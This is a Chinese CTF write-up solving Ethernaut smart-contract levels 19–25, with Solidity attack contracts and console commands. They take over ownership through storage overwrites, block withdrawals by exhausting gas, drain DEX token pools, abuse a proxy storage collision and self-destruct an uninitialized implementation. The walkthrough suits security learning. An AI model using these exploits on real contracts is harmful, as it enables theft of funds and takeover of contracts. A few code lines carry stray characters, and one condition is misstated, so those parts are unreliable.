其实有人会觉得困惑？也没有个函数选择器啥的？其实这里需要补充一下，平常我们通过solidity编写智能合约后，在编译时会植入函数选择器。而我们本关卡没有这一步骤，所以就如同remix调用的图一样，所有函数其实都执行的同一块命令，得到的是同一个结果。
<hr>

# 19 AlienCodex
## 创建实例并分析
根据先前的步骤，创建合约实例，其合约地址为`0xc4017fe2BD1Cb4629E0225B6CCe2c712138588Ef`。本关卡的目的是获取合约的所有权。那我们先看看合约内有没有设置所有权的代码？
```
contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;
  ...
}
```
看到代码就知道，合约里应该是没有设置所有权的代码，那我们可能就要想办法从其他地方入手了。发现代码里有这段：
```
  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
```
看来就是这里了，想办法从这里入手，通过该操作以改变插槽存储值的大小。
## 合约交互
我们先看看slot里存的都是些什么？

![查询slot存储](https://img-blog.csdnimg.cn/d547abd7ffa0402693283f193c4e791a.png#pic_center)
由于合约继承了`Ownable`合约，所以slot0中存储的就是`owner`对象，此时为`0xda5b3Fb76C78b6EdEE6BE8F11a1c31EcfB02b272`。实际上该地址就是创建目标合约的地址，如下图所示：

![ownable变量](https://img-blog.csdnimg.cn/f8e4ee3b16bf410db5849a2221160fc4.png#pic_center), the owner will still get their share
而存储的`contact`变量也是在`slot 0`中（一个插槽长度为32位，能够存放地址（20）+布尔型（1）），目前为0即为false。slot1存储的则是`codex`动态数组，更准确来说，应该是`codex`动态数组的长度，而具体的下标内容呢？会按序存储在`keccak256(bytes(1))+x`的插槽内，其中，x就是数组的下标。所以我们将插槽表示出来：

```
-----------------------------------------------------
| unused(11 bytes) |contact = false  |  0xda5b3Fb76C78b6EdEE6BE8F11a1c31EcfB02b272       | <- slot 0
-----------------------------------------------------
| codex length =0       | <- slot 1
-----------------------------------------------------
...
-----------------------------------------------------
| codex data[0]      | <- slot ??
-----------------------------------------------------
```
我们现在计算codex data的起始插槽，应该是`0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6`

![计算起始数据插槽](https://img-blog.csdnimg.cn/8682de2425274d6fa54f489a7157b79a.png#pic_center)
我们先测试一下准确性。由于`contacted modifier`的存在，我们先修改`contact`变量。调用`await contact.make_contact()`，再次查看插槽数值，可以发现变量成功被修改。 
![成功修改contact变量](https://img-blog.csdnimg.cn/5a13e0877c754766af9960ac295fae4c.png#pic_center)
先存一个值看看，`await contract.record("0x000000000000000000000000000000000000000000000000000000000000aaaa")`测试一下。此时，插槽长度发生变化，同时存储数据也有所修改。

![测试](https://img-blog.csdnimg.cn/a88dc3e346c34022a59fff431a0d3d99.png#pic_center)
再存一个值看看，`await contract.record("0x000000000000000000000000000000000000000000000000000000000000bbbb")`测试一下。此时，插槽长度发生变化，同时存储数据也有所修改。

![成功](https://img-blog.csdnimg.cn/b1dc83710d0d43989f2f3eed7cc8ea30.png#pic_center)
现在我们就希望通过修改`codex`的`data`导致溢出最终修改slot 0。
首先我们连续调用三次`await contract.retract()`将`codex.length`下溢出为`2**256-1`。此时先前输入的数据均已丢失。

![修改codex.length](https://img-blog.csdnimg.cn/4ef0371e8eac429eb1e8654b62776189.png#pic_center)
那下标该是多少呢？应该是`2**256-1-0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6+1`。因为我们到达末端后需要再进一位产生上溢出，返回slot0。在计算的过程中我们遇到一个问题，那就是javascript会利用科学计数法，而这会导致精度的丢失。为了简便起见，我们用remix计算，结果是`35707666377435648211887908874984608119992236509074197713628505308453184860938`。

![使用remix辅助计算](https://img-blog.csdnimg.cn/b29b51706b7045a6967cf1e85148f795.png#pic_center)
那我们就用`await contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938',player)`来调用，此时会覆盖原有slot。但一检查发现不对，结果跑前面去了。看来我们又要修改一下，不能直接传入`player`，需要传入`0x0000000000000000000000000bD590c9c9d88A64a15B4688c2B71C3ea39DBe1b`。

![在这里插入图片描述](https://img-blog.csdnimg.cn/fddd6ff9b9134283b4ec07c34eae0ac7.png#pic_center)
输入`await contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938','0x0000000000000000000000000bD590c9c9d88A64a15B4688c2B71C3ea39DBe1b')`，此举是在地址前面补齐24个0,凑足24*4+40*4=256位即32bytes，从而将地址存入正确的存储位置。
![修改后重新发起](https://img-blog.csdnimg.cn/8e645e1ee0b54e02be7a9312c3036e33.png#pic_center#pic_center)
此时，合约所有者已经成功修改。
![成功修改](https://img-blog.csdnimg.cn/c2f39625a89e4941a930a49ac5906dcd.png#pic_center)
提交实例，本关卡成功！
![关卡成功](https://img-blog.csdnimg.cn/6ba9f1d4808849ec938dd3b88b0b5fc9.png#pic_center)
## 总结
在涉及到owner方面（或者其他重要变量）一定要慎重，寻找所有的可能性。
<hr>

# 20 Denial
## 创建实例并分析
根据先前的步骤，创建合约实例，其合约地址为`0xeb587746E66F008f686521669B5ea99735b1310B`。本关卡的目的是阻止`owner`提款。我们先看看各角色是什么。

```
    function withdraw() public {
        uint amountToSend = address(this).balance.div(100);
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        owner.transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = now;输入
        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
    }
```
每当用户提款时，会调用`withdraw`函数，取出1%发给`partner`，还有1%发给`owner`。我们能做的就是在`partner`端定义函数，使的发给`owner`的步骤无法进行。

然而，合约中调用的是`call`并附上了所有gas。我们先回顾一下`send`、`call`和`transfer`之间的区别。

- transfer如果异常会转账失败，并抛出异常，存在gas限制
- send如果异常会转账失败，返回false，不终止执行，存在gas限制
- call如果异常会转账失败，返回false，不终止执行，没有gas限制

所以我们的入手点就是消耗光其gas，光失败不会终止后续执行的！

如何消耗呢？那我们就来看看`require`和`assert`。

- `assert`会消耗掉所有剩余的gas并恢复所有的操作
- `require`会退还所有剩余的gas并返回一个值

所以我们似乎可以在assert上下功夫。

## 攻击合约编写
攻击合约很简单，就是默认`assert(false)`并回滚一切操作。

```
pragma solidity ^0.6.0;


contract attacker {

    constructor() public {
    }
    
    fallback() external payable {
        assert(false);
    }

}
```

## 合约交互
部署攻击合约，地址为`0xF8fc486804A40d654CC7ea37B9fdae16D0A5d8a7`。

![部署攻击合约](https://img-blog.csdnimg.cn/f0cd3cd1374e4f0ca6516766b8428192.png#pic_center)
输入`await contract.setWithdrawPartner('0xF8fc486804A40d654CC7ea37B9fdae16D0A5d8a7')`将攻击合约设置为`partner`角色。
![设置partner](https://img-blog.csdnimg.cn/d4ed6acd369842efa564a9c6a5e79116.png#pic_center)
此时我们发起`withdraw`测试一下。输入`await contract.withdraw()`，结果发现由于gas耗尽，所以失败。
![withdraw调用失败](https://img-blog.csdnimg.cn/296c2424b45f449683000578bbd2dc4e.png#pic_center)
提交实例，本关卡成功！
![关卡成功](https://img-blog.csdnimg.cn/61901287084249e98a07f9d5f0c28736.png#pic_center)
## 总结
还是那句老话，合约的交互是难以信任的。
<hr>

# 21 Shop
## 创建实例并分析

根据先前的步骤，创建合约实例，其合约地址为`0xaF30cef990aD1D3b641Bad72562f62FF3A0977C7`。本关卡的目的是用低于问讯要求的价格实现购买。其具体代码段如下：

```
  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
```
合约会询问用户`msg.sender`（所以可以是智能合约）的出价，如果其`price()`函数返回的结果超过当前的定价并且商品仍未卖出，则会将定价设为用户的出价。现在看应该是要求用户两次出价返回的结果不同。然而，我们可以看到`Buyer`类型的接口`price()`是一个`view`类型的函数，这表明只能读取变量而不应当对变量有所修改，即不能改变当前合约的状态。这可怎么办呢？

那么有没有办法能够使得`view`方法两次返回的值不同呢？目前来说，有两种方法：

- 依托于外部合约的变化
- 依托于本身变量的变化

## 攻击合约编写
### 外部合约的状态变化
如果`view`类型方法依托于外部合约的状态，通过询问外部变量，即可无修改地实现返回值的区别。

同样基于remix，我们编写合约如下：

```
pragma solidity ^0.6.0;


interface Shop {
  function buy() external;
  function isSold() external view returns (bool);码
}

contract attacker {

    Shop shop;

    constructor(address _addr) public {
        shop = Shop(_addr);
    }

    function attack() public {
        shop.buy();
    }

    function price() external view returns (uint){
        if (!shop.isSold()){
            return 101;
        }else{
            return 99;
        }
    }

}
```

此时由于在请求`price()`前后`Shop`合约的`isSold`变量已发生了变化，所以我们可以基于该变量设置`if`规则，这种方法是适用的。

### 本身变量的变化
如果我们依赖于`now`、`timestamp`等变量，的确可以实现在不同区块下`view`类型的函数会返回不同结果，然而，在同一区块下，似乎仍难以区分开来。

我们有如下合约:

```
contract attacker2 {

    Shop shop;
    uint time;

    constructor(address _addr) public {
        shop = Shop(_addr);
        time = now;
    }

    function attack() public {
        shop.buy();
    }

    function price() external view returns (uint){
        return (130-(now-time));
    }

}
```
在不同时刻调用`view`类型的`price`函数，返回的值是有区别的。然而，在同一区块呢，很难去达成区别，所以是不够适用的。
![115](https://img-blog.csdnimg.cn/49cfb30ead59485f97e2dcefa3f6a5f9.png#pic_center)

![106](https://img-blog.csdnimg.cn/6d61f478c1ac423da9dd5f37e971c456.png#pic_center)

## 合约交互
先查看合约当前状态。
![合约当前状态](https://img-blog.csdnimg.cn/b9da6f932ef149708ab768ab4e8e5f18.png#pic_center)
部署攻击合约，合约地址为`0x8201E303702976dc3E203a4D3cDe244D522274bf`。
![部署攻击合约](https://img-blog.csdnimg.cn/f234b804f02c4bb9b916432c92d3cefa.png#pic_center)
此时调用`price`方法，返回`101`。
![获取当前价格](https://img-blog.csdnimg.cn/d2fd489bfc644fca8538ae963e7161b8.png#pic_center)
调用`attack`方法发起进攻。调用完后刷新目标合约状态。此时商品已卖出，价格为99。
![刷新目标合约状态](https://img-blog.csdnimg.cn/47c3db13fac84268b406a8fa0c8ddea2.png#pic_center)
提交实例，本关卡完成！
![本关卡完成！](https://img-blog.csdnimg.cn/a0ff00a9e6544e15a0fb6c827b1f3017.png#pic_center)
## 总结
有时候从另一个角度去想问题，这和我们常规理解的可能不一样。
<hr>

# 22 Dex
## 创建实例并分析

根据先前的步骤，创建合约实例，其合约地址为`0x28B73f0b92f69A35c1645a56a11877b044de3366`。本关卡的是DEX（Decentralized Exchange，去中心化交易所）的简易版本。

对合约展开分析，合约中只存有两个通证合约，一个是`token1`，一个是`token2`。

```
  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }
```
而合约支持我们根据通证之间的比率进行兑换。兑换的价格为两个通证的数量之比。
```
  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }
```
这里发现**有一个问题**，我们暂且按下不表。
那我们需要做什么呢？就是利用这里面不对称的汇率，实现套利，挖空交易合约里的通证（一种即可）。

由于在`swap`里已经限定只能围绕`token1`和`token2`展开交易。所以我们只能从汇率入手了。那这就回到我们一开始发现的问题，对于单次交易来说，汇率是恒定的！**对一般的去中心化交易所来说，都会有滑点(Slippage)的概念，即随着交易额的增长，理论汇率和实际汇率之间的差值会越来越大！** 而很明显，本关卡合约没有滑点的概念，这就使得我们能获取到的兑换额度要比实际值大的多。多兑换几次，我们就能很快掏空交易池。

## 合约交互
我们先看看交易池内`token1`、`token2`和我们账户通证的数量。

![查看当前交易池和用户余额](https://img-blog.csdnimg.cn/9292e7decd5f4cd6857d05e3699b5e71.png#pic_center)

如果我们要将手头的10个`token1`兑换为`token2`，首先我们通过`await contract.approve(contract.address,10)`完成授权。
![授权](https://img-blog.csdnimg.cn/56873243c9114ef9a5406f97e55826a9.png#pic_center)
随后我们通过`await contract.swap(token1,token2,10)`将10个`token1`兑换为`token2`。根据初始汇率`1:1`我们可以获取到10个`token2`。此时我们有了0个`token1`、20个`token2`，但交易所现在有110个`token1`、90个`token2`，如果我们将10个`token2`兑换回去，我们可以获得不止10个`token1`!这就是套利!

![兑换成功](https://img-blog.csdnimg.cn/21a750231ebd4fe5825807838dbf0737.png#pic_center)


通过下表展示套利过程，其中由于精度有限所以汇率往往只能精确到小数点后1位。最后一次我们根据汇率不完全兑换，只兑换46个(`110/2.4=45.83`)，结果失败（因为交易池没有那么多）。后来发现，直接兑换45个即可。

| 交易池token1 | 交易池token2 | 汇率1-2 | 汇率2-1 | 用户token1 | 用户token2 | 兑换币种 | 兑换后用户token1 | 兑换后用户token1 |
| ------------ | ------------ | ------- | ------- | ---------- | ---------- | -------- | ---------------- | ---------------- |
| 100          | 100          | 1       | 1       | 10         | 10         | token1   | 0                | 20               |
| 110          | 90           | 0.818   | 1.222   | 0          | 20         | token2   | 24               | 0                |
| 86           | 110          | 1.28    | 0.782   | 24         | 0          | token1   | 0                | 30               |
| 110          | 80           | 0.727   | 1.375   | 0          | 30         | token2   | 41               | 0                |
| 69           | 110          | 1.694   | 0.627   | 41         | 0          | token1   | 0                | 65               |
| 110          | 45           | 0.409   | 2.44    | 0          | 65         | token2   | 110              | 20               |

此时，交易池的`token1`已经被掏空！提交关卡，本关卡成功！
![关卡成功！](https://img-blog.csdnimg.cn/fe9ca952146a448694943f5ba9eaaf92.png#pic_center)
## 总结
涉及到`Dex`这种`Defi`项目，智能合约的编写一定要慎之又慎。
<hr>

# 23 Dex2
## 创建实例并分析
根据先前的步骤，创建合约实例，其合约地址为`0xF8A6bcdD3B5297f489d22039F5d3D1e3D58570bA`。本关卡仍是DEX（Decentralized Exchange，去中心化交易所）的简易版本。

乍一看，这题跟上个没啥区别阿。但仔细一看似乎缺了点什么？
```
  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  } 
```
里面不再对币种的地址作校验了，那我们能否部署自己的通证合约，并通过相关方法提供流动性，并最终掏空池子呢？

## 编写攻击合约
我们参考目标合约中的`SwappableToken`合约，编写攻击合约如下：

```
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract SwappableTokenAttack is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public returns(bool){
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

部署合约，其合约地址为`0x82c06a4a75b99f90B773B5e90bD8B5b9E18BFf6e`
![部署合约](https://img-blog.csdnimg.cn/3a405ee777694bffb02705cdb72d8938.png#pic_center)
## 合约交互
我们首先实现`approve`授权许可，给目标合约8个攻击通证的授权。
![approve许可](https://img-blog.csdnimg.cn/f2e9e9e3c963441c8d10d6a8fe515903.png#pic_center)
随后，我们通过`await contract.add_liquidity('0x82c06a4a75b99f90B773B5e90bD8B5b9E18BFf6e',1)`将攻击通证加入`DEX`。结果失败，原来我们不是合约的`owner`。
![添加流动性失败](https://img-blog.csdnimg.cn/595e5149ccad47dabaaf3db3d2c5b68a.png#pic_center)
这影响吗？不影响，我们可以在攻击合约中手动转账。
![手动转账](https://img-blog.csdnimg.cn/04192cc2709847629b215104d14370a0.png#pic_center)
此时，获取一下攻击通证转换`token1`的汇率呗～ `await contract.getSwapAmount('0x82c06a4a75b99f90B773B5e90bD8B5b9E18BFf6e',await contract.token1(),1)`，结果发现我们可以全部掏空`token1`!

![在这里插入图片描述](https://img-blog.csdnimg.cn/140cd096d4794be58ebd3b3049ba1d3a.png#pic_center)
那就发起把，先后输入`await contract.swap('0x82c06a4a75b99f90B773B5e90bD8B5b9E18BFf6e',await contract.token1(),1)`和`await contract.swap('0x82c06a4a75b99f90B773B5e90bD8B5b9E18BFf6e',await contract.token2(),2)`以实现将交易池掏空！成功！（对`token2`使用2个攻击通证是因为我们此时汇率已经下降到`1:50`了）

![成功掏空](https://img-blog.csdnimg.cn/48e56d8438ba4b428874bffb16bd3df7.png#pic_center)
提交关卡，本关卡成功！
![本关卡成功](https://img-blog.csdnimg.cn/6f2adc2157da4d3d915ce32baf35eb0e.png#pic_center)
## 总结
智能合约真是处处漏洞阿，有时间一定要研究一下UniSwap！
<hr>

# 24 Puzzle Wallet
## 创建实例并分析
根据先前的步骤，创建合约实例，其合约地址为`0xd1B77Be5ECD09964e521b36A35804c46bb5a9ED9`。这个时候我们还不知道这个合约实例到底是什么。而我们的目的是要成为`proxy`的所有者。

初看关卡里的合约，可能会很困惑，这里面又是`proxy`又是`wallet`，这到底时是要干什么呢？在深入分析本关卡的合约之前，我们需要了解一下什么叫代理模式，否则我们无法明白其中的门门道道。

学过设计模式的同学其实都知道什么是代理模式：为其他对象提供一种代理以控制对某个对象的访问。也就是说，**每次我要访问A，其实我是通过调用B的接口，而B中存有A的对象实例，并对外暴露与A相同的接口，这时候，当我们调用B时，我们仍以为自己在访问A，并对其中代理部分浑然不觉。**

那么，代理模式的优点又在哪里呢？**如果业务有更新，完全可以实现热部署，代理实例通过切换对象实例，此时使用者不会感觉到服务有中断或者发生了变化。**

而在智能合约中，要使用代理模式，思路也是一样的，就是为了解决合约一旦上链无法更新的问题。当我们需要更新合约时，只要将代理合约中的合约实例指向新创建的合约即可。此时，对和代理合约交互的用户来说，并没有感到服务产生了变化。**现在很多链游就是基于以上原理，可以不断的更新合约、更新游戏**。而转发具体是怎么实现的呢？其实就是利用`fallback`函数，当用户访问不存在的函数时，会进入`fallback`，代理合约在此处即可完成转发。

回到正题，我们现在获得的`0xd1B77Be5ECD09964e521b36A35804c46bb5a9ED9`究竟是什么？是`PuzzleProxy`还是`PuzzleWallet`呢？我们从三个角度来看一看。

<hr>

- 合约创建角度
	
	我们截图看看我们创建实例时的内部调用。

![创建实例时的内部调用](https://img-blog.csdnimg.cn/d753b5f9943e4f9192bda73d803e98a6.png#pic_center)
可以看出，用户地址调用`Ethernaut合约地址`，后者调用`关卡合约`，由`关卡合约`分别创建`0xd04cb22addf0bc25858935688482ad328c839e97`及`0xd1b77be5ecd09964e521b36a35804c46bb5a9ed9`，而`0xd1b77be5ecd09964e521b36a35804c46bb5a9ed9`被创建后，又通过`delegatecall`调用了`0xd04cb22addf0bc25858935688482ad328c839e97`。这似乎就很明朗了，`0xd04cb22addf0bc25858935688482ad328c839e97`应该是`Puzzle Wallet`，`0xd1b77be5ecd09964e521b36a35804c46bb5a9ed9`则是代理合约。想想的确也是这样，代理合约在初始化时肯定也需要指定实例合约。

```
    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) public {
        admin = _admin;
    }
```


- 合约创建源码

	我们可以在`Ethernaut`的github项目中找到[工厂合约](https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/contracts/levels/PuzzleWalletFactory.sol)

```
  function createInstance(address /*_player*/) override public payable returns (address) {
    require(msg.value ==  0.001 ether, "Must send 0.001 ETH to create instance");

    // deploy the PuzzleWallet logic
    PuzzleWallet walletLogic = new PuzzleWallet();

    // deploy proxy and initialize implementation contract
    bytes memory data = abi.encodeWithSelector(PuzzleWallet.init.selector, 100 ether);
    PuzzleProxy proxy = new PuzzleProxy(address(this), address(walletLogic), data);
    PuzzleWallet instance = PuzzleWallet(address(proxy));

    // whitelist this contract to allow it to deposit ETH
    instance.addToWhitelist(address(this));
    instance.deposit{ value: msg.value }();

    return address(proxy);
  }
```

很明显，是先创建`PuzzleWallet`，然后创建`PuzzleProxy`并最后返回`proxy`地址。

- 逻辑推理

很明显，对外暴露的应该是`代理合约`，实际合约应当藏在代理合约的后面。

<hr>

那可能又有疑惑了，我这里`contract.abi`获得的结果为什么又是`PuzzleWallet`的abi呢？其实没问题，本来暴露的就应该是实际合约的接口咯。

那这么一看的话，我们的切入点又在哪里呢？

其实`代理合约`通过`delegatecall`调用`实例合约`，这里面有一个我们先前提过的问题，就是需要两个合约之间的存储槽不能产生冲突，否则会导致数据被随意修改。那我们就来看看，其实本关卡是存在存储冲突这一问题的。

先看`PuzzleProxy`，其定义变量如下，而[UpgradeableProxy](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3/contracts/proxy/UpgradeableProxy.sol)并没有定义变量。

```
contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;
}
```

因此，其`slot`存储如下：

```
-----------------------------------------------------
| unused (12bytes)      |  pendingAdmin (address 20bytes) |< - slot 0
-----------------------------------------------------
| unused (12bytes)      |  admin (address 20bytes) |< - slot 1
-----------------------------------------------------
```
而`PuzzleWallet`中变量存储如下：

```
-----------------------------------------------------
| unused (12bytes)      |  owner(address 20bytes) |< - slot 0
-----------------------------------------------------
| maxBalance  |< - slot 1
-----------------------------------------------------
| whitelised(占位)  |< - slot 2
-----------------------------------------------------
| balances(占位)  |< - slot 3
-----------------------------------------------------
```
所以很明显，产生了存储冲突，`proxy`中的`pendingAdmin`及`admin`实际上对应在`puzzleWallet`中应该是`owner`及`maxBalance`。所以如果我们想修改`admin`其实可以从`maxBalance`入手，或者通过`pendingAdmin`等看一看。


## 合约交互
想要通过`setMaxBalance`修改`maxBalance`有一个先决条件，那就是`onlyWhitelisted`，即用户需要在白名单中。而要添加到白名单，需要调用`addToWhitelist`方法，这又需要`require(msg.sender == owner, "Not the owner");`，所以我们可以先通过修改`pendingAdmin`修改`owner`，然后在逐一完成。

我们先生成`selector`将其和`param`合并生成交易中的`data`，以此可以发起对`proposeNewAdmin(address)`方法的调用。在修改过后此时合约的`owner`已修改为`'0x0bD590c9c9d88A64a15B4688c2B71C3ea39DBe1b'`。
![通过pendingAdmin修改owner](https://img-blog.csdnimg.cn/05bad01160f7484ca2a0a373f52a1f66.png#pic_center)
通过`await contract.addToWhitelist(player)`将用户添加到白名单中，此时再用`await contract.whitelisted(player)`进行检查。

![添加白名单](https://img-blog.csdnimg.cn/6ff9c3e7c3eb4d83b4d2e6ace3e81e91.png#pic_center)
然后，如果要设置`setMaxBalance`需要满足条件`require(address(this).balance == 0, "Contract balance is not 0");`即合约本身余额不能为0，而我们通过`await getBalance(contract.address)`可以查询到合约还有余额`0.001`以太。我们应当办法将其移除。

![不满足条件](https://img-blog.csdnimg.cn/8d5a88ce0d244d20bc038b55b1850263.png#pic_center)

此时我们可以查看到槽的存储情况如下，`slot 0`已变成了用户地址，而`slot 1`却是关卡合约的地址。

![目前存储情况](https://img-blog.csdnimg.cn/60edb4a2b9ed43e0af8f8afb49aace04.png#pic_center)
这是什么原因呢？这是因为，在初始化代理合约时，`admin`变量已经确定，所以当后续调用`init`时，由于存储冲突，所以`maxBalance`不为0，所以该方法其实调用就失败了，原始值也就没有更改。

我们想到`multicall`里面有这么一个限制：

```
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
```
这是什么意思呢？ 那就是**只能存一次**，如果在`multicall`里调用两次`deposite`函数，我们也不应当重复计算所存的数量。这里只是简单的对data的选择器作了单层校验，我们如果将其封装，似乎是可以绕过的。

我们需要找到调用时发送的数据。其中`selector`的数据为：

![deposit](https://img-blog.csdnimg.cn/e4bedddff8254956b6d74af7634f017e.png#pic_center)
组装成`multicall`时，其数据为：

![multicall](https://img-blog.csdnimg.cn/4e55fe7db7c841b2a43fee14c5ecc9d2.png#pic_center)
再将其封装，`data`与`selector`一起传入，调用`multicall`，同时附上0.001Ether，此时由于没有两个`deposit`同时调用，就可以绕过。相当于`msg.value`被重复计算了两次。
![发起multicall](https://img-blog.csdnimg.cn/9ade417563fb4a82ba9006f642694f0e.png#pic_center)
此时，可以看出用户在合约中的份额实际变为0.002Ether。

![余额改变](https://img-blog.csdnimg.cn/24eaee5bde8c493f90656dbeccd02221.png#pic_center)

通过`await contract.execute(player,web3.utils.toWei('0.002'),0x0)`取出所有的Ether，此时合约`balance`为0。此时，由于满足了我们先前所说的条件，在此之后我们就可以通过`setMaxBalance`去设置`maxBalance`从而改变`admin`了。

![execute](https://img-blog.csdnimg.cn/299e166066cb44bda2eb4459ff7bcd3a.png#pic_center)
通过`await contract.setMaxBalance('0x0000000000000000000000000bD590c9c9d88A64a15B4688c2B71C3ea39DBe1b')`改变`maxBalance`，此时可以发现，`slot 1 `中的值也随之发生改变，对应的`admin`也发生了改变。

![成功修改](https://img-blog.csdnimg.cn/2ad1822df331439cbf6e0eb8aa29d208.png#pic_center)
提交实例，本关卡成功！

![关卡成功！](https://img-blog.csdnimg.cn/5e32094a3dfc425aae76413f23abbcfd.png#pic_center)

## 总结
代理合约虽好，但其中的坑可不少，一定要仔细设计，用心斟酌。


<hr>

# 25 Motorbike
## 创建实例并分析
根据先前的步骤，创建合约实例，其合约地址为`0x620Edcd5C5B957E35c9e4E1BB3e8612DD62B9c48`。本关卡的要求是通过自毁`Engine`从而使得`Motorbike`合约失效。

我们先来看看这题究竟想要干什么：吸取了上一题的教训，这题很明显也注意到存储`slot`冲突的问题了，代理合约`Motorbike`不再定义变量去存储，而是定义了**被代理合约`Engine`地址存储的槽编号**。

```
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
```

其所有的业务操作都是通过`fallback()`函数调用`_delegate()`实现的。
```
    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`. 
    // Will run if no other function in the contract matches the call data
    fallback () external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
```
每当有新的请求进来，则会先从存储中获取`slot`结构体，并在`_delegate`中进行`Engine`方法的调用。

接下来我们看看`Engine`合约，合约定义了一系列函数，其中还包括`upgradeToAndCall`等函数。除了业务逻辑之外，`Motorbike`合约的升级也是由`Engine`实现，所作的其实是修改对应槽的位置并初步调用新的函数（一般来说是初始化函数）。

```
    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }
    
    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
        
        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
```
现在我们就要思考攻击的入口了。如果我们仍是以`motorbike`为对象展开攻击，仍是以`delegatecall`方式，那么即使自毁，销毁的也将是`motorbike`合约。所以我们应该是以`engine`为入口。考虑到`engine`本身并没有自毁，且其也有升级方法，所以我们可以将`engine`作为代理合约，自己新建业务合约，最终完成攻击。

## 攻击合约编写
我们先编写攻击合约，其实很简单，就是带有自毁函数的合约。部署后，其合约地址为`0x3A69C8B5c1CB0Fb85485EfB3577E9d8f1131CB82`。
```
pragma solidity ^0.6.0;

contract Attacker {

    constructor() public {

    }

    function destruct(address payable addr) public {
        selfdestruct(addr);
    }

}
```

## 合约交互

如果我们想要发起攻击，就应当找到`Engine`合约究竟是什么？通过`Motorbike`可知，其地址作为值存储在`slot 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`中。所以我们通过`await web3.eth.getStorageAt(contract.address,'0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')`获取`Engine`合约地址为`0x917e11b988a0aa6184ab8e129fb8bf61cb14cc70`。

![获取地址](https://img-blog.csdnimg.cn/4964cde420cd433da8ce5b3daa47891e.png#pic_center)
此时，我们看一看`Engine`的存储状态，其实都是为空，其原因是`Engine`只作为函数的提供者，具体变量状态的存储则是通过`Motorbike`执行。此时`Engine`本身就是未经初始过的新合约！考虑到在修改业务合约时，需要保证`player`的角色为`upgrader`，所以我们将通过`initialize`完成初始化。

![查询Engine存储](https://img-blog.csdnimg.cn/bba4ff2c26e54e98b9893bf09c1e879e.png#pic_center)
我们通过`await web3.eth.sendTransaction({from:player,to:engine,data:selector})`生成新的交易，此时`Engine`合约已完成初始化，显示`initialized`为`1(true)`，`initializing`为`0(false)`，而`upgrader`也变为了`player`，对应的`horsepower`也完成了修改。

![完成先决条件](https://img-blog.csdnimg.cn/498bcaea65e54bfeb2eedebc2299d282.png#pic_center)
此时，`player`的角色已经修改为了`upgrader`，所以我们可以调用`upgradeToAndCall`完成业务合约的修改。

首先我们要构建调用合约时的`data`，一般有几种方法。

- 第一种是`selector + param`，分别算出函数选择器和参数并组合。(函数选择器也可以通过`encodeFunctionSignature`完成)
![1](https://img-blog.csdnimg.cn/880bd6ce934d44babdeb3110ea352d5b.png#pic_center)
